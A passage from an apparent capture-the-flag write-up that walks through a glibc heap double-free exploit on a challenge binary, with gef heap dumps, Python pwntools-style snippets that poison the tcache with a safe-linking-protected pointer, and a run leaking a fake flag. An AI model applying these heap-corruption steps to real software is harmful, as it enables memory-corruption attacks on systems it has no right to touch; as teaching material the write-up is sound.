Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55a408a433e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55a408a433a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55a408a433e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  →  [loop detected]

gef➤  x/16gx 0x000055a408a432a0
0x55a408a432a0:	0x000055a408a43330	0x0000000000000000
0x55a408a432b0:	0x000055a408a433a0	0x000055a408a433c0
0x55a408a432c0:	0x000055a408a433e0	0x0000000000000000
0x55a408a432d0:	0x0000000000000000	0x0000000000000000
0x55a408a432e0:	0x0000000000000000	0x0000000000000000
0x55a408a432f0:	0x0000000000000000	0x0000000000000000
0x55a408a43300:	0x0000000000000000	0x0000000000000000
0x55a408a43310:	0x0000000000000000	0x0000000000000000
```
We can see now that the address of the slot 4 appears twice in the `fastbin`. We will now have to get it by a first `malloc` to set the address to the slot 0.
#### Double free exploitation
In the setup of the double free, we set a chunk to appear twice in the `fastbin`. That way, we will be able to allocate this chunk using `malloc` and to write to it to modify the address to the next pointer. That way, when we will allocate it a second time, we will modify the address of the next chunk allocated through `malloc`:
```py
# Remove all the chunks in the tcachelist
for i in range(7):
    create_memory(b'txt\n')

# Put the protected address to the slot 0 in the bin
create_memory(bytes(reversed(bytes.fromhex(protected_slot_zero_address))) + b'\x00\n')
```
Let's look at the heap:
```
gef➤  heap chunks
Chunk(addr=0x5580408d5010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005580408d5010     03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5580408d52a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005580408d52a0     30 53 8d 40 80 55 00 00 c0 53 8d 40 80 55 00 00    0S.@.U...S.@.U..]
Chunk(addr=0x5580408d5330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005580408d5330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]

gef➤  heap bins
─ Tcachebins for thread 1 ─
Tcachebins[idx=0, size=0x20, count=3] ←  Chunk(addr=0x5580408d53a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5580408d53e0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5580408d52a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x5580408d52a0]
```
You can first notice that the chunks are not in the `fastbin` anymore but have been moved in the `tcachebin`. This is an operation done by `malloc`, but it does not change anything to our exploit. Indeed, we can see that the address of the slot 0 (`0x5580408d52a0`) now appears in the bin. It means that the third chunk we will allocate will be the slot 0. So we want to write the address to the flag to the slot 1:
```py
create_memory(b'txt\n')
create_memory(b'txt\n')
create_memory(b'A'*8 + bytes(reversed(bytes.fromhex(flag_address))) + b'\x00\n')
```
The last line writes 8 bytes of garbage in the slot 0, and then the address of the flag to the slot 1:
```
gef➤  heap chunks
Chunk(addr=0x5617b984c010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005617b984c010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5617b984c2a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005617b984c2a0     41 41 41 41 41 41 41 41 30 c3 84 b9 17 56 00 00    AAAAAAAA0....V..]
Chunk(addr=0x5617b984c330, size=0x50, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005617b984c330     73 72 64 6e 6c 65 6e 7b 66 61 6b 65 5f 66 6c 61    srdnlen{fake_fla]
```
The first slot of the initial array is now full of garbage, and the second slot is a pointer to the flag. If we try to retrieve the content of the slot 1, we should get the flag:
```py
r = read_memory(b'1\n')
print(b'flag: ' + r)
```
Indeed, if we run the entire exploit:
```
$ python3 exploit.py 
[+] Starting local process './k511.elf': pid 4821
Protected = 0x55ce0dd83502
Unprotected = 0x55cb516d23d0
Flag = 0x55cb516d2330
Slot 0 address = 0x55cb516d22a0
Slot 0 address = 0x55cb516d22a0
Slot 0 protected address = 0x55ce0dd83472
b'flag: srdnlen{fake_flag}'
[*] Stopped process './k511.elf' (pid 4821)
```